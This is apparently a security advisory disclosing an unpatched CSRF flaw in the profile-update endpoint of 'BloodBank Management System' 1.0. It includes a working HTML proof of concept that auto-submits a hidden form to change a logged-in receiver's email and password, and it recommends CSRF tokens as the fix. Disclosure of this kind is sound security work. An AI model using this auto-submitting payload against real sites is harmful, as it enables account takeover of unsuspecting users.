
## **Affected Version:**
- **BloodBank Management System**: 1.0

## **Vulnerability Information:**
- **Vulnerability Type:** Cross Site Request Forgery (CSRF)
- **Severity:** HIGH
- **Status:** Unpatched

## **Vulnerable Endpoint:**
- **Path:** `/file/updateprofile.php`

## **Vulnerability Description:**
There is a CSRF vulnerability on this endpoint `/file/updateprofile.php` which allows a remote user to update the profile details of a `receiver` including their `email` address and `password` which leads to full account takeover of the `receiver's` account.

Successful exploitation can lead to **unauthorized actions ie modification of data and account takeover** of the `receiver's` account.

---

## **Proof of Concept (PoC):**

Below is an example of a **CSRF POC Attack** that updates the profile details of a logged in `receiver's` account, host the file on an attacker controlled domain in my case i was using `localhost`:

```html

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>CSRF PoC with Account Takeover</title>
</head>
<body>
    <h2>CSRF Proof of Concept with Account Takeover</h2>

    <!-- Form to exploit CSRF vulnerability for updating profile -->
    <form id="csrfForm" action="http://localhost.local/bloodbank/file/updateprofile.php" method="POST">
        <input type="hidden" name="rname" value="attacker">
        <input type="hidden" name="remail" value="attacker@malicious.com">
        <input type="hidden" name="rpassword" value="test1234">
        <input type="hidden" name="rphone" value="0777112233">
        <input type="hidden" name="rcity" value="gotham">
        <input type="hidden" name="bg" value="B-">
        <input type="hidden" name="update" value="Update">
    </form>

    <script>
        // Submit the CSRF form to update profile
        document.getElementById("csrfForm").submit();
   </script>
</body>
</html>





```

---



## **Impact:**
- **Data Manipulation:** Attackers could modify the content displayed to users.
- **Reputational Damage:** Users may lose trust in the system due to malicious behavior.

---

## **Mitigation Recommendations:**
1. **Use CSRF Token** Implement mechanism to deter cross domain access or put `csrf tokens` in your request

---
